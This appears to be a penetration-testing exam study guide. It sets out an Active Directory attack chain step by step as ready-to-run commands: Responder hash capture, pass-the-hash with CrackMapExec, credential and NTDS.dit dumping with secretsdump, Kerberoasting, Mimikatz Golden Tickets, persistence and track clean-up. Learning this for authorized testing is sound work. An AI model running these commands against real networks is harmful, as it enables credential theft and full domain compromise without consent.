---

# 🛡️ Enhanced Active Directory Attack Methodology: Step-by-Step Guide

This methodology emphasizes detailed enumeration, attack path prioritization, and practical techniques directly from your notes. Each phase includes critical commands and exam tips for quick reference.

---

## 🔍 **Phase 1: Reconnaissance and Initial Access**

### 1. **Network Scanning and Identifying Vulnerabilities**

- **Identify Live Hosts and Open Ports:**
    - **Command:** `nmap -T4 -A -p- <target_IP_range>`
    - **📝 Note:** Use the `T` flag to adjust scan speed for stealth or speed.
- **Check for SMB Signing:**
    - **Command:** `nmap --script=smb2-security-mode.nse -p445 <target_IP>`
    - **💡 Look For:** "Message signing enabled but not required" to identify vulnerable SMB hosts.
- **Attempt Default Credentials on Services:**
    - Access services' web interfaces using common default logins (e.g., `admin:admin`).

### ✔️ **Checklist:**

- [ ]  Run Nmap scan
- [ ]  Check SMB signing status
- [ ]  Test default credentials on identified services

---

## 🎣 **Phase 2: Traffic Capture with Responder**

### 1. **Launch Responder to Capture Credentials**

- **Run Responder:**
    - **Command:** `sudo responder -I <interface> -wPv`
    - **⚠️ Replace `<interface>`** with your network interface (e.g., `eth0`).
- **Induce Network Traffic:**
    - Attempt to access a non-existent network share to trigger traffic: `\\\\\\\\<attacker_IP>\\\\invalid_share`.
- **Analyze Responder Output:**
    - **Save captured hashes** (e.g., NTLMv2 hashes) for further cracking attempts.

### ✔️ **Checklist:**

- [ ]  Run Responder on the network
- [ ]  Induce network traffic if no response is seen
- [ ]  Save captured hashes for cracking

---

## 🛠️ **Phase 3: Enhanced Enumeration and Prioritization**

### 1. **Enumerate Accounts and Domain Information**

- **Enumerate with `ldapdomaindump`:**
    - **Command:** `sudo /usr/bin/ldapdomaindump ldaps://<DC_IP> -u 'MARVEL\\\\\\\\<username>' -p <password>`
    - **Prioritize:** Check `domain_users_by_group.html` for high-privilege users (e.g., Domain Admins) and accounts with the `DONT_EXPIRE_PASSWD` flag.
- **Use BloodHound for Detailed Analysis:**
    - **Focus On:** "Find All Domain Admins" and "Kerberos Interaction" to identify attack paths.
- **Quick Assessment with PlumHound:**
    - **Commands:** Use `easy` flag for rapid checks and prioritize outputs like "Domain Admins (Direct)" and "Kerberoastable Users."

### ✔️ **Checklist:**

- [ ]  Run `ldapdomaindump` to gather domain information
- [ ]  Use BloodHound for comprehensive analysis
- [ ]  Perform a quick assessment with PlumHound

### 📌 **Common Flags Explained:**

- **`u` and `p` in `ldapdomaindump`**: Specify domain username and password for the connection.
- **`easy` flag in PlumHound:** Run predefined quick queries for rapid insight.

---

## 🚀 **Phase 4: Privilege Escalation and Lateral Movement**

### 1. **Crack Captured Hashes (Optional but Recommended)**

- **Use Hashcat for NTLM Hashes:**
    - **Command:** `hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --force --show`

### 2. **Pass-the-Hash and Pass-the-Password Attacks**

- **Pass-the-Hash with CrackMapExec:**
    - **Command:** `crackmapexec smb <target_IP_range> -u <username> -H "<hash>" --local-auth`
    - **💡 Look For:** "Pwn3d!" in the output to confirm successful access.
- **Pass-the-Password with CrackMapExec:**
    - **Command:** `crackmapexec smb <target_IP_range> -u <username> -d <domain> -p <password>`

### 3. **Credential Dumping with `secretsdump.py`**

- **Dump Credentials:**
    - **Command:** `secretsdump.py <domain>/<username>:<password>@<target_IP>`

### 4. **Kerberoasting and Token Impersonation**

- **Enumerate Service Accounts for Kerberoasting:**
    - **Command:** `sudo GetUserSPNs.py <domain>/<username>:<password> -dc-ip <DC_IP>`
- **Crack Kerberos Tickets:**
    - **Command:** `hashcat -m 13100 <ticket_file.txt> /usr/share/wordlists/rockyou.txt`
- **Token Impersonation with Metasploit:**
    - **Command:** `meterpreter > impersonate_token <domain>\\\\<username>`

### ✔️ **Checklist:**

- [ ]  Crack hashes using Hashcat
- [ ]  Attempt Pass-the-Hash and Pass-the-Password attacks
- [ ]  Use `secretsdump.py` to extract credentials
- [ ]  Enumerate service accounts using `GetUserSPNs.py`
- [ ]  Crack Kerberos tickets and attempt token impersonation

---

## 🏴 **Phase 5: Domain Controller Compromise**

### 1. **Dumping the NTDS.dit Database**

- **Extract NTLM Hashes:**
    - **Command:** `secretsdump.py <domain>/<username>:<password>@<DC_IP> -just-dc-ntlm`

### 2. **Crack NTLM Hashes for Domain Admin Access**

- **Use Hashcat:**
    - **Command:** `hashcat -m 1000 ntds.txt /usr/share/wordlists/rockyou.txt`

### 3. **Golden Ticket Attack (If krbtgt is Compromised)**

- **Use Mimikatz to Create Golden Ticket:**
    - **Command:** `mimikatz # kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID> /krbtgt:<krbtgt_hash> /id:500 /ptt`

### ✔️ **Checklist:**

- [ ]  Dump NTDS.dit using `secretsdump.py`
- [ ]  Crack NTLM hashes with Hashcat
- [ ]  Create and use a Golden Ticket (if krbtgt is compromised)

---

## 🛡️ **Phase 6: Persistence, Clean-Up, and Adaptation**

### 1. **Establish Persistence**

- **Create New Admin Accounts:** If permitted, establish a new admin account for future access.

### 2. **Cover Your Tracks**

- **Clean Up Traces:** Remove tools, logs, and scripts used during the attack to minimize detection.

### 3. **Adapt and Adjust Strategy**

- **Refine Approach:** Use information gathered from enumeration tools (`ldapdomaindump`, BloodHound) to adapt your attack strategy.
- **Look for Additional Weaknesses:** Pivot to new attack methods if the current path is blocked.

### ✔️ **Checklist:**

- [ ]  Consider establishing persistence methods
- [ ]  Clean up traces if ethically permissible
- [ ]  Adjust strategy based on findings

---

## 🏆 **Key Considerations for Exam Success**

- **🎯 Focus on Specific Commands:** Practice each command to ensure familiarity.
- **⏱️ Manage Time Efficiently:** Streamline each phase for optimal exam performance.
- **🧩 Interpret Outputs:** Be able to quickly analyze the results from tools like Responder, CrackMapExec, and Hashcat.

---